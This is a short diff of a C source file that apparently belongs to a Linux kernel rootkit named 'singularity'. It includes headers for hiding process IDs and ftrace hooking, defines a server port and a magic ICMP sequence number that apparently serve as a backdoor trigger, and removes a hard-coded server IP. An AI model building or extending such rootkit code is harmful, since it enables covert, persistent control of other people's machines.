@@ -3,7 +3,6 @@
 #include "../include/hidden_pids.h"
 #include "../ftrace/ftrace_helper.h"
 
-#define YOUR_SRV_IP "127.0.0.1"
 #define SRV_PORT "8081"
 #define PROC_NAME "singularity"
 #define ICMP_MAGIC_SEQ 1337
